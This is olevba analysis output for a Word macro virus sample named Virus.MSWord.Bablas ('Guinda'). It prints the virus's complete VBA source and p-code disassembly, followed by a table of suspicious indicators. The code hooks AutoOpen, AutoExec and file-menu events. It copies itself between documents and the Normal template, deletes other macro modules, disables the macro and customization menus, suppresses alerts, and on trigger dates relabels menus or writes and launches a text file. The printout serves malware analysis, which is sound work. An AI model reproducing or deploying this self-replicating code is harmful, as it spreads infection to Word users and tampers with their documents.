olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: ./Virus.MSWord.Bablas.bs
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: ./Virus.MSWord.Bablas.bs - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO GUINDA.bas 
in file: ./Virus.MSWord.Bablas.bs - OLE stream: 'Macros/VBA/GUINDA'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub Initializer()
On Error Resume Next
With Application
.UserName = "• Ian Ace Culallad •"""
.UserAddress = "IFONTOC"
.UserInitials = "IAAC"
End With
With Dialogs(wdDialogFileSummaryInfo)
.Author = " •Ian Ace•"""
.Title = "[Guinda]"
.Subject = "IAAC/GGCB"
.Comments = "You're my very Best Guinda"
.Execute
End With
With Options
.SaveNormalPrompt = False
.ConfirmConversions = False
End With
Application.ScreenUpdating = False
Application.DisplayStatusBar = False
Application.DisplayAlerts = False
CommandBars("Tools").Controls("Macro").Enabled = False
CommandBars("Tools").Controls("Customize...").Enabled = False
CommandBars("View").Controls("Toolbars").Enabled = False
End Sub

Sub ToolsMacro()
    G = Date
    G = MsgBox("Sik-a kayet Guinda!", vbQuestion + vbOKOnly)
End Sub

Sub ViewVbCode()
    ToolsMacro
End Sub

Sub FileTemplates()
    ToolsMacro
End Sub

Sub Ifontocs1()
    On Error Resume Next
    Application.Caption = "Guinda is now on the run"
    ActiveWindow.Caption = "•Ian Ace•"""
End Sub

Sub Ifontocs2()
    On Error Resume Next
    Application.Caption = "Microsoft Word"
    ActiveWindow.Caption = ActiveDocument.Name
End Sub

Sub Fulangag()
    Dim Check_Stat As Boolean
    Check_Stat = False
    For Each Obj In ActiveDocument.VBProject.VBComponents
        If Obj.Name = "GUINDA" Then Check_Stat = True
        If Obj.Name <> "GUINDA" And Obj.Name <> "ThisDocument" Then
            Application.OrganizerDelete Source:=ActiveDocument.FullName, Name:=Obj.Name, Object:=wdOrganizerObjectProjectItems
        End If
    Next Obj
    If Check_Stat = False Then
        Application.StatusBar = "Copying my Guinda From Normal Template to " + ActiveDocument.Name + "..."
        Application.OrganizerCopy Source:=NormalTemplate.FullName, Destination:=ActiveDocument, Name:="GUINDA", Object:=wdOrganizerObjectProjectItems
    End If
End Sub

Sub Fulingig()
    Dim Status_Ok As Boolean
    Status_Ok = False
    For Each Obj In NormalTemplate.VBProject.VBComponents
        If Obj.Name = "GUINDA" Then Status_Ok = True
        If Obj.Name <> "GUINDA" And Obj.Name <> "ThisDocument" Then
            Application.OrganizerDelete Source:=NormalTemplate.FullName, Name:=Obj.Name, Object:=wdOrganizerObjectProjectItems
        End If
    Next Obj
    If Status_Ok = False Then
        Application.StatusBar = "Copying my Guinda From " + ActiveDocument.Name + " to Normal Template..."
        Application.OrganizerCopy Source:=ActiveDocument.FullName, Destination:=NormalTemplate.FullName, Name:="GUINDA", Object:=wdOrganizerObjectProjectItems
        Application.DisplayRecentFiles = False
        Application.DisplayRecentFiles = True
    End If
End Sub

Sub Check_Me()
On Error Resume Next
Randomize
Aces = (Int(Rnd * 6))
If Aces = 3 Then
For WWW = 1 To (Int(Rnd * 10))
ActiveDocument.Shapes.AddShape(Int(Rnd * 100), Int(Rnd * 150), Int(Rnd * 200), Int(Rnd * 250), Int(Rnd * 300)).Select
Selection.ShapeRange.Fill.ForeColor.RGB = RGB(Int(Rnd * 255), Int(Rnd * 255), Int(Rnd * 255))
Selection.ShapeRange.Fill.Visible = msoTrue
Selection.ShapeRange.Fill.Solid
Next WWW
End If
End Sub

Sub Inasin()
On Error Resume Next
If Month(Date) = 3 And Day(Date) = 8 Or Month(Date) = 10 And Day(Date) = 28 Then                              ' check random conditions
CommandBars("Tools").Controls("Macro").Caption = "[IFONTOC]"
CommandBars("Insert").Controls("Break...").Caption = "Fulangag Mo!"
CommandBars("Help").Controls("About Microsoft Word").Caption = "You're my very Best Guinda!"
CommandBars("File").Controls("Properties").Caption = "Guindalo"
CommandBars("Tools").Controls("Word Count...").Caption = "Fulingig Mo!"
CommandBars("File").Controls("Close").Caption = "Tain Inam"
CommandBars("File").Controls("New...").Caption = "Ian Ace Culallad"
CommandBars("File").Controls("Open...").Caption = "Glenda Grace Buking"
CommandBars("Format").Controls("Bullets and Numbering...").Caption = "Montanosa"

Randomize
Ians = (Int(Rnd * 8))
ElseIf Ians = 4 Then

Open "c:\Guindalo.vxd" For Output As 1
Print #1, "Glenda Grace;"
Print #1, "Our love has been assaulted many times, and I am convinced that it is true"
Print #1, "because the longer I am away from you, the greater is my yearning to be with you again. You "
Print #1, "I cherish any thought of you, prize any memory of you that rises from the depths of my mind, and live for the day when our physical separation will no longer be. "
Print #1, "Remember that I always believe in you....."
Print #1, "Take Good Care and....I love you...."
Print #1, "Sik-a kayet nan laylaychek"
Print #1, "Love lots;"
Print #1, "Ian Ace"
Close 1
Shell "write c:\Guindalo.vxd", vbMaximizedFocus
End If
End Sub


Sub FileNew()
On Error Resume Next
    Initializer
    Fulangag
    Dialogs(wdDialogFileNew).Show
    Fulingig
End Sub

Sub FileExit()
On Error Resume Next
    Initializer
    Fulangag
    Fulingig
    If ActiveDocument.Saved = False Then ActiveDocument.Save
    Application.Quit
End Sub

Sub FileOpen()
On Error Resume Next
    Initializer
    Ifontocs1
    WordBasic.DisableAutoMacros True
    On Error Resume Next
    If Dialogs(wdDialogFileOpen).Show <> 0 Then
        Fulangag
        ActiveDocument.Save
    End If
    Ifontocs2
    WordBasic.DisableAutoMacros False
End Sub

Sub AutoOpen()
On Error Resume Next
    Initializer
    Ifontocs1
    Fulingig
    On Error Resume Next
    NormalTemplate.Save
    Ifontocs2
End Sub

Sub FileClose()
On Error Resume Next
    Initializer
    Fulangag
    Check_Me
    ActiveDocument.SaveAs FileName:=ActiveDocument.FullName, FileFormat:=wdFormatDocument
    ActiveDocument.Close
End Sub

Sub FileSave()
On Error Resume Next
        Initializer
        Fulangag
        Fulingig
        ActiveDocument.Save
End Sub

Sub FileSaveAs()
On Error Resume Next
    Initializer
    Fulangag
    Fulingig
    Dialogs(wdDialogFileSaveAs).Show
    Fulangag
    Fulingig
End Sub

Sub AutoExec()
    WordBasic.DisableAutoMacros True
    Inasin
    Initializer
End Sub


-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: ./Virus.MSWord.Bablas.bs
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 903 bytes
' Macros/VBA/GUINDA - 10971 bytes
' Line #0:
' 	FuncDefn (Sub Initializer())
' Line #1:
' 	OnError (Resume Next) 
' Line #2:
' 	StartWithExpr 
' 	Ld Application 
' 	With 
' Line #3:
' 	LitStr 0x0015 "• Ian Ace Culallad •""
' 	MemStWith UserName 
' Line #4:
' 	LitStr 0x0007 "IFONTOC"
' 	MemStWith UserAddress 
' Line #5:
' 	LitStr 0x0004 "IAAC"
' 	MemStWith UserInitials 
' Line #6:
' 	EndWith 
' Line #7:
' 	StartWithExpr 
' 	Ld wdDialogFileSummaryInfo 
' 	ArgsLd Dialogs 0x0001 
' 	With 
' Line #8:
' 	LitStr 0x000B " •Ian Ace•""
' 	MemStWith Author 
' Line #9:
' 	LitStr 0x0008 "[Guinda]"
' 	MemStWith Title 
' Line #10:
' 	LitStr 0x0009 "IAAC/GGCB"
' 	MemStWith Subject 
' Line #11:
' 	LitStr 0x001A "You're my very Best Guinda"
' 	MemStWith Comments 
' Line #12:
' 	ArgsMemCallWith Execute 0x0000 
' Line #13:
' 	EndWith 
' Line #14:
' 	StartWithExpr 
' 	Ld Options 
' 	With 
' Line #15:
' 	LitVarSpecial (False)
' 	MemStWith SaveNormalPrompt 
' Line #16:
' 	LitVarSpecial (False)
' 	MemStWith ConfirmConversions 
' Line #17:
' 	EndWith 
' Line #18:
' 	LitVarSpecial (False)
' 	Ld Application 
' 	MemSt ScreenUpdating 
' Line #19:
' 	LitVarSpecial (False)
' 	Ld Application 
' 	MemSt DisplayStatusBar 
' Line #20:
' 	LitVarSpecial (False)
' 	Ld Application 
' 	MemSt DisplayAlerts 
' Line #21:
' 	LitVarSpecial (False)
' 	LitStr 0x0005 "Macro"
' 	LitStr 0x0005 "Tools"
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	MemSt Enabled 
' Line #22:
' 	LitVarSpecial (False)
' 	LitStr 0x000C "Customize..."
' 	LitStr 0x0005 "Tools"
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	MemSt Enabled 
' Line #23:
' 	LitVarSpecial (False)
' 	LitStr 0x0008 "Toolbars"
' 	LitStr 0x0004 "View"
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	MemSt Enabled 
' Line #24:
' 	EndSub 
' Line #25:
' Line #26:
' 	FuncDefn (Sub ToolsMacro())
' Line #27:
' 	Ld Date 
' 	St G 
' Line #28:
' 	LitStr 0x0013 "Sik-a kayet Guinda!"
' 	Ld vbQuestion 
' 	Ld vbOKOnly 
' 	Add 
' 	ArgsLd MsgBox 0x0002 
' 	St G 
' Line #29:
' 	EndSub 
' Line #30:
' Line #31:
' 	FuncDefn (Sub ViewVbCode())
' Line #32:
' 	ArgsCall ToolsMacro 0x0000 
' Line #33:
' 	EndSub 
' Line #34:
' Line #35:
' 	FuncDefn (Sub FileTemplates())
' Line #36:
' 	ArgsCall ToolsMacro 0x0000 
' Line #37:
' 	EndSub 
' Line #38:
' Line #39:
' 	FuncDefn (Sub Ifontocs1())
' Line #40:
' 	OnError (Resume Next) 
' Line #41:
' 	LitStr 0x0018 "Guinda is now on the run"
' 	Ld Application 
' 	MemSt Caption 
' Line #42:
' 	LitStr 0x000A "•Ian Ace•""
' 	Ld ActiveWindow 
' 	MemSt Caption 
' Line #43:
' 	EndSub 
' Line #44:
' Line #45:
' 	FuncDefn (Sub Ifontocs2())
' Line #46:
' 	OnError (Resume Next) 
' Line #47:
' 	LitStr 0x000E "Microsoft Word"
' 	Ld Application 
' 	MemSt Caption 
' Line #48:
' 	Ld ActiveDocument 
' 	MemLd New 
' 	Ld ActiveWindow 
' 	MemSt Caption 
' Line #49:
' 	EndSub 
' Line #50:
' Line #51:
' 	FuncDefn (Sub Fulangag())
' Line #52:
' 	Dim 
' 	VarDefn Check_Stat (As Boolean)
' Line #53:
' 	LitVarSpecial (False)
' 	St Check_Stat 
' Line #54:
' 	StartForVariable 
' 	Ld Obj 
' 	EndForVariable 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ForEach 
' Line #55:
' 	Ld Obj 
' 	MemLd New 
' 	LitStr 0x0006 "GUINDA"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitVarSpecial (True)
' 	St Check_Stat 
' 	EndIf 
' Line #56:
' 	Ld Obj 
' 	MemLd New 
' 	LitStr 0x0006 "GUINDA"
' 	Ne 
' 	Ld Obj 
' 	MemLd New 
' 	LitStr 0x000C "ThisDocument"
' 	Ne 
' 	And 
' 	IfBlock 
' Line #57:
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed Source 
' 	Ld Obj 
' 	MemLd New 
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerDelete 0x0003 
' Line #58:
' 	EndIfBlock 
' Line #59:
' 	StartForVariable 
' 	Ld Obj 
' 	EndForVariable 
' 	NextVar 
' Line #60:
' 	Ld Check_Stat 
' 	LitVarSpecial (False)
' 	Eq 
' 	IfBlock 
' Line #61:
' 	LitStr 0x002A "Copying my Guinda From Normal Template to "
' 	Ld ActiveDocument 
' 	MemLd New 
' 	Add 
' 	LitStr 0x0003 "..."
' 	Add 
' 	Ld Application 
' 	MemSt StatusBar 
' Line #62:
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	ParamNamed Source 
' 	Ld ActiveDocument 
' 	ParamNamed Destination 
' 	LitStr 0x0006 "GUINDA"
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerCopy 0x0004 
' Line #63:
' 	EndIfBlock 
' Line #64:
' 	EndSub 
' Line #65:
' Line #66:
' 	FuncDefn (Sub Fulingig())
' Line #67:
' 	Dim 
' 	VarDefn Status_Ok (As Boolean)
' Line #68:
' 	LitVarSpecial (False)
' 	St Status_Ok 
' Line #69:
' 	StartForVariable 
' 	Ld Obj 
' 	EndForVariable 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ForEach 
' Line #70:
' 	Ld Obj 
' 	MemLd New 
' 	LitStr 0x0006 "GUINDA"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitVarSpecial (True)
' 	St Status_Ok 
' 	EndIf 
' Line #71:
' 	Ld Obj 
' 	MemLd New 
' 	LitStr 0x0006 "GUINDA"
' 	Ne 
' 	Ld Obj 
' 	MemLd New 
' 	LitStr 0x000C "ThisDocument"
' 	Ne 
' 	And 
' 	IfBlock 
' Line #72:
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	ParamNamed Source 
' 	Ld Obj 
' 	MemLd New 
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerDelete 0x0003 
' Line #73:
' 	EndIfBlock 
' Line #74:
' 	StartForVariable 
' 	Ld Obj 
' 	EndForVariable 
' 	NextVar 
' Line #75:
' 	Ld Status_Ok 
' 	LitVarSpecial (False)
' 	Eq 
' 	IfBlock 
' Line #76:
' 	LitStr 0x0017 "Copying my Guinda From "
' 	Ld ActiveDocument 
' 	MemLd New 
' 	Add 
' 	LitStr 0x0016 " to Normal Template..."
' 	Add 
' 	Ld Application 
' 	MemSt StatusBar 
' Line #77:
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed Source 
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	ParamNamed Destination 
' 	LitStr 0x0006 "GUINDA"
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerCopy 0x0004 
' Line #78:
' 	LitVarSpecial (False)
' 	Ld Application 
' 	MemSt DisplayRecentFiles 
' Line #79:
' 	LitVarSpecial (True)
' 	Ld Application 
' 	MemSt DisplayRecentFiles 
' Line #80:
' 	EndIfBlock 
' Line #81:
' 	EndSub 
' Line #82:
' Line #83:
' 	FuncDefn (Sub Check_Me())
' Line #84:
' 	OnError (Resume Next) 
' Line #85:
' 	ArgsCall Read 0x0000 
' Line #86:
' 	Ld Rnd 
' 	LitDI2 0x0006 
' 	Mul 
' 	FnInt 
' 	Paren 
' 	St Aces 
' Line #87:
' 	Ld Aces 
' 	LitDI2 0x0003 
' 	Eq 
' 	IfBlock 
' Line #88:
' 	StartForVariable 
' 	Ld WWW 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld Rnd 
' 	LitDI2 0x000A 
' 	Mul 
' 	FnInt 
' 	Paren 
' 	For 
' Line #89:
' 	Ld Rnd 
' 	LitDI2 0x0064 
' 	Mul 
' 	FnInt 
' 	Ld Rnd 
' 	LitDI2 0x0096 
' 	Mul 
' 	FnInt 
' 	Ld Rnd 
' 	LitDI2 0x00C8 
' 	Mul 
' 	FnInt 
' 	Ld Rnd 
' 	LitDI2 0x00FA 
' 	Mul 
' 	FnInt 
' 	Ld Rnd 
' 	LitDI2 0x012C 
' 	Mul 
' 	FnInt 
' 	Ld ActiveDocument 
' 	MemLd Shapes 
' 	ArgsMemLd AddShape 0x0005 
' 	ArgsMemCall Set 0x0000 
' Line #90:
' 	Ld Rnd 
' 	LitDI2 0x00FF 
' 	Mul 
' 	FnInt 
' 	Ld Rnd 
' 	LitDI2 0x00FF 
' 	Mul 
' 	FnInt 
' 	Ld Rnd 
' 	LitDI2 0x00FF 
' 	Mul 
' 	FnInt 
' 	ArgsLd RSet 0x0003 
' 	Ld Selection 
' 	MemLd ShapeRange 
' 	MemLd Fill 
' 	MemLd ForeColor 
' 	MemSt RSet 
' Line #91:
' 	Ld msoTrue 
' 	Ld Selection 
' 	MemLd ShapeRange 
' 	MemLd Fill 
' 	MemSt Visible 
' Line #92:
' 	Ld Selection 
' 	MemLd ShapeRange 
' 	MemLd Fill 
' 	ArgsMemCall Solid 0x0000 
' Line #93:
' 	StartForVariable 
' 	Ld WWW 
' 	EndForVariable 
' 	NextVar 
' Line #94:
' 	EndIfBlock 
' Line #95:
' 	EndSub 
' Line #96:
' Line #97:
' 	FuncDefn (Sub Inasin())
' Line #98:
' 	OnError (Resume Next) 
' Line #99:
' 	Ld Date 
' 	ArgsLd Month 0x0001 
' 	LitDI2 0x0003 
' 	Eq 
' 	Ld Date 
' 	ArgsLd Day 0x0001 
' 	LitDI2 0x0008 
' 	Eq 
' 	And 
' 	Ld Date 
' 	ArgsLd Month 0x0001 
' 	LitDI2 0x000A 
' 	Eq 
' 	Ld Date 
' 	ArgsLd Day 0x0001 
' 	LitDI2 0x001C 
' 	Eq 
' 	And 
' 	Or 
' 	IfBlock 
' 	QuoteRem 0x006E 0x0018 " check random conditions"
' Line #100:
' 	LitStr 0x0009 "[IFONTOC]"
' 	LitStr 0x0005 "Macro"
' 	LitStr 0x0005 "Tools"
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	MemSt Caption 
' Line #101:
' 	LitStr 0x000C "Fulangag Mo!"
' 	LitStr 0x0008 "Break..."
' 	LitStr 0x0006 "Insert"
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	MemSt Caption 
' Line #102:
' 	LitStr 0x001B "You're my very Best Guinda!"
' 	LitStr 0x0014 "About Microsoft Word"
' 	LitStr 0x0004 "Help"
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	MemSt Caption 
' Line #103:
' 	LitStr 0x0008 "Guindalo"
' 	LitStr 0x000A "Properties"
' 	LitStr 0x0004 "File"
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	MemSt Caption 
' Line #104:
' 	LitStr 0x000C "Fulingig Mo!"
' 	LitStr 0x000D "Word Count..."
' 	LitStr 0x0005 "Tools"
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	MemSt Caption 
' Line #105:
' 	LitStr 0x0009 "Tain Inam"
' 	LitStr 0x0005 "Close"
' 	LitStr 0x0004 "File"
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	MemSt Caption 
' Line #106:
' 	LitStr 0x0010 "Ian Ace Culallad"
' 	LitStr 0x0006 "New..."
' 	LitStr 0x0004 "File"
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	MemSt Caption 
' Line #107:
' 	LitStr 0x0013 "Glenda Grace Buking"
' 	LitStr 0x0007 "Open..."
' 	LitStr 0x0004 "File"
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	MemSt Caption 
' Line #108:
' 	LitStr 0x0009 "Montanosa"
' 	LitStr 0x0018 "Bullets and Numbering..."
' 	LitStr 0x0006 "Format"
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	MemSt Caption 
' Line #109:
' Line #110:
' 	ArgsCall Read 0x0000 
' Line #111:
' 	Ld Rnd 
' 	LitDI2 0x0008 
' 	Mul 
' 	FnInt 
' 	Paren 
' 	St Ians 
' Line #112:
' 	Ld Ians 
' 	LitDI2 0x0004 
' 	Eq 
' 	ElseIfBlock 
' Line #113:
' Line #114:
' 	LitStr 0x000F "c:\Guindalo.vxd"
' 	LitDI2 0x0001 
' 	LitDefault 
' 	Open (For Output)
' Line #115:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x000D "Glenda Grace;"
' 	PrintItemNL 
' Line #116:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x004A "Our love has been assaulted many times, and I am convinced that it is true"
' 	PrintItemNL 
' Line #117:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x005C "because the longer I am away from you, the greater is my yearning to be with you again. You "
' 	PrintItemNL 
' Line #118:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x00A2 "I cherish any thought of you, prize any memory of you that rises from the depths of my mind, and live for the day when our physical separation will no longer be. "
' 	PrintItemNL 
' Line #119:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x002A "Remember that I always believe in you....."
' 	PrintItemNL 
' Line #120:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0024 "Take Good Care and....I love you...."
' 	PrintItemNL 
' Line #121:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x001A "Sik-a kayet nan laylaychek"
' 	PrintItemNL 
' Line #122:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x000A "Love lots;"
' 	PrintItemNL 
' Line #123:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0007 "Ian Ace"
' 	PrintItemNL 
' Line #124:
' 	LitDI2 0x0001 
' 	Close 0x0001 
' Line #125:
' 	LitStr 0x0015 "write c:\Guindalo.vxd"
' 	Ld vbMaximizedFocus 
' 	ArgsCall Shell 0x0002 
' Line #126:
' 	EndIfBlock 
' Line #127:
' 	EndSub 
' Line #128:
' Line #129:
' Line #130:
' 	FuncDefn (Sub FileNew())
' Line #131:
' 	OnError (Resume Next) 
' Line #132:
' 	ArgsCall Initializer 0x0000 
' Line #133:
' 	ArgsCall Fulangag 0x0000 
' Line #134:
' 	Ld wdDialogFileNew 
' 	ArgsLd Dialogs 0x0001 
' 	ArgsMemCall Show 0x0000 
' Line #135:
' 	ArgsCall Fulingig 0x0000 
' Line #136:
' 	EndSub 
' Line #137:
' Line #138:
' 	FuncDefn (Sub FileExit())
' Line #139:
' 	OnError (Resume Next) 
' Line #140:
' 	ArgsCall Initializer 0x0000 
' Line #141:
' 	ArgsCall Fulangag 0x0000 
' Line #142:
' 	ArgsCall Fulingig 0x0000 
' Line #143:
' 	Ld ActiveDocument 
' 	MemLd Saved 
' 	LitVarSpecial (False)
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld ActiveDocument 
' 	ArgsMemCall Save 0x0000 
' 	EndIf 
' Line #144:
' 	Ld Application 
' 	ArgsMemCall Quit 0x0000 
' Line #145:
' 	EndSub 
' Line #146:
' Line #147:
' 	FuncDefn (Sub FileOpen())
' Line #148:
' 	OnError (Resume Next) 
' Line #149:
' 	ArgsCall Initializer 0x0000 
' Line #150:
' 	ArgsCall Ifontocs1 0x0000 
' Line #151:
' 	LitVarSpecial (True)
' 	Ld WordBasic 
' 	ArgsMemCall DisableAutoMacros 0x0001 
' Line #152:
' 	OnError (Resume Next) 
' Line #153:
' 	Ld wdDialogFileOpen 
' 	ArgsLd Dialogs 0x0001 
' 	MemLd Show 
' 	LitDI2 0x0000 
' 	Ne 
' 	IfBlock 
' Line #154:
' 	ArgsCall Fulangag 0x0000 
' Line #155:
' 	Ld ActiveDocument 
' 	ArgsMemCall Save 0x0000 
' Line #156:
' 	EndIfBlock 
' Line #157:
' 	ArgsCall Ifontocs2 0x0000 
' Line #158:
' 	LitVarSpecial (False)
' 	Ld WordBasic 
' 	ArgsMemCall DisableAutoMacros 0x0001 
' Line #159:
' 	EndSub 
' Line #160:
' Line #161:
' 	FuncDefn (Sub AutoOpen())
' Line #162:
' 	OnError (Resume Next) 
' Line #163:
' 	ArgsCall Initializer 0x0000 
' Line #164:
' 	ArgsCall Ifontocs1 0x0000 
' Line #165:
' 	ArgsCall Fulingig 0x0000 
' Line #166:
' 	OnError (Resume Next) 
' Line #167:
' 	Ld NormalTemplate 
' 	ArgsMemCall Save 0x0000 
' Line #168:
' 	ArgsCall Ifontocs2 0x0000 
' Line #169:
' 	EndSub 
' Line #170:
' Line #171:
' 	FuncDefn (Sub FileClose())
' Line #172:
' 	OnError (Resume Next) 
' Line #173:
' 	ArgsCall Initializer 0x0000 
' Line #174:
' 	ArgsCall Fulangag 0x0000 
' Line #175:
' 	ArgsCall Check_Me 0x0000 
' Line #176:
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed FileName 
' 	Ld wdFormatDocument 
' 	ParamNamed FileFormat 
' 	Ld ActiveDocument 
' 	ArgsMemCall SaveAs 0x0002 
' Line #177:
' 	Ld ActiveDocument 
' 	ArgsMemCall Close 0x0000 
' Line #178:
' 	EndSub 
' Line #179:
' Line #180:
' 	FuncDefn (Sub FileSave())
' Line #181:
' 	OnError (Resume Next) 
' Line #182:
' 	ArgsCall Initializer 0x0000 
' Line #183:
' 	ArgsCall Fulangag 0x0000 
' Line #184:
' 	ArgsCall Fulingig 0x0000 
' Line #185:
' 	Ld ActiveDocument 
' 	ArgsMemCall Save 0x0000 
' Line #186:
' 	EndSub 
' Line #187:
' Line #188:
' 	FuncDefn (Sub FileSaveAs())
' Line #189:
' 	OnError (Resume Next) 
' Line #190:
' 	ArgsCall Initializer 0x0000 
' Line #191:
' 	ArgsCall Fulangag 0x0000 
' Line #192:
' 	ArgsCall Fulingig 0x0000 
' Line #193:
' 	Ld wdDialogFileSaveAs 
' 	ArgsLd Dialogs 0x0001 
' 	ArgsMemCall Show 0x0000 
' Line #194:
' 	ArgsCall Fulangag 0x0000 
' Line #195:
' 	ArgsCall Fulingig 0x0000 
' Line #196:
' 	EndSub 
' Line #197:
' Line #198:
' 	FuncDefn (Sub AutoExec())
' Line #199:
' 	LitVarSpecial (True)
' 	Ld WordBasic 
' 	ArgsMemCall DisableAutoMacros 0x0001 
' Line #200:
' 	ArgsCall Inasin 0x0000 
' Line #201:
' 	ArgsCall Initializer 0x0000 
' Line #202:
' 	EndSub 
' Line #203:
' Line #204:
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoExec            |Runs when the Word document is opened        |
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|Suspicious|Open                |May open a file                              |
|Suspicious|write               |May write to a file (if combined with Open)  |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|vbMaximizedFocus    |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|run                 |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

